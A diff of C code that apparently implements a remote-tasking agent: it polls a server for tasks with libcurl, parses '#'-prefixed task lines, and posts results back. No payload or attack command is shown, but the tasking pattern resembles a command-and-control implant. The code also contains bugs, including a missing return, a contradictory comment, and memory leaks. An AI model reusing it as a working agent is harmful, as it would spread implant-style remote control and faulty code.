@@ -14,6 +14,12 @@
 
 #define UUIDLEN 36
 
+// Each task begins with a #(35 in DEC).
+#define TASK_LINE 35
+
+// Each task file ends with a $(36 in DEC).
+#define END_OF_TASK_FILE 36
+
 // ref https://curl.se/libcurl/c/postit2.html
 
 static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp);
@@ -148,14 +154,9 @@ bool check_tasks(struct agent_info *agent, struct strings_array *sa)
 	// Send data to this function as opposed to writing to stdout.
 	curl_easy_setopt(web.curl, CURLOPT_WRITEFUNCTION, mem_cb);
 
-	// Pass chunk to callback function.
+	// Pass sa object to callback function.
 	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)sa);
 
-	// set options
-	// perform our action
-	// curl_easy_perform accepts the options set above and in this case will
-	// download the content from the URL.
-	// CURLcode resul saves the return code from curl_easy_perform.
 	CURLcode result = curl_easy_perform(web.curl);
 
 	printf("The data returning from check tasks is %s\n\n", sa->response);
@@ -264,4 +265,110 @@ bool post_results(struct strings_array *sa)
 	curl_mime_free(web.form);
 
 	return true;
+}
+
+bool parse_tasks(char *response, struct tasks *task)
+{
+	char line[1024] = { '\0' };
+	puts("before char_to_file\n");
+	FILE *response_file = char_to_file(response);
+	puts("after char_to_file\n");
+
+	task->strings = malloc((task->cap) * sizeof(*task->strings));
+	if (!task->strings) {
+		perror("Unable to create space for words.\n");
+		return 1;
+	}
+	int count = 0;
+// While loop reads each line FILE *word_source (file(s) or stdin).
+	while (fgets(line, sizeof(line), response_file) != NULL) {
+		++count;
+		printf("Line nmb %d %s\n", count, line);
+		/*Resizes the array after a valid token is created to allocate
+			space for new token. */
+		if (task->sz == task->cap) {
+			task->cap *= 2;
+			char **tmp_space = realloc(task->strings,
+							task->cap *
+							sizeof(*task->strings));
+			if (!tmp_space) {
+				perror("Unable to resize.\n");
+				fclose(response_file);
+				destroy(task);
+				return false;
+			}
+			task->strings = tmp_space;
+		}
+
+		size_t len = strlen(line) + 1;
+		task->strings[task->sz] =
+			malloc(len * sizeof(task->strings[task->sz]));
+		if (!task->strings[task->sz]) {
+			perror("Unable to resize.\n");
+			fclose(response_file);
+			destroy(task);
+			return false;
+		}
+		
+		if (line[0] == TASK_LINE) {
+			strncpy(task->strings[task->sz], line + 1, len);
+			task->sz++;
+		}
+		// strncpy(task->strings[task->sz], line, len);
+		// task->sz++;
+
+		// Each task file ends with a #(35 in DEC).
+		if (line[0] == END_OF_TASK_FILE) {
+			puts("hit break statment\n");
+			break;
+		}
+
+	}
+	puts("********PARSED TASKS*************************");
+	for (unsigned int i = 0; i < task->sz; i++) {
+		printf("%s\n", task->strings[i]);
+	}
+	// fclose(sa->word_source);
+}
+
+void destroy(struct tasks *task)
+{
+
+	/* Iterates through array elements and frees memory of each line in words
+	array.*/
+	for (unsigned int j = 0; j < task->sz; j++) {
+		if (task->strings[j]) {
+			free(task->strings[j]);
+		}
+	}
+	// Frees memory for entire file names array.
+	free(task->strings);
+}
+
+//ref https://stackoverflow.com/questions/52974572/cast-char-to-file-without-saving-the-file
+FILE *char_to_file(char *data) {
+
+    int len;
+	len = strlen(data);
+
+    int p[2];
+    if (pipe(p) == -1) {
+        perror("pipe failed");
+        return NULL;
+    }
+
+    int rval;
+    if ((rval = write(p[1], data, len)) == -1) {
+        perror("write failed");
+        close(p[0]);
+        close(p[1]);
+        return NULL;
+    } else if (rval < len) {
+        printf("write failed, wrote %d, expected %d\n", rval, len);
+        close(p[0]);
+        close(p[1]);
+        return NULL;
+    }
+
+    return fdopen(p[0], "r");
 }
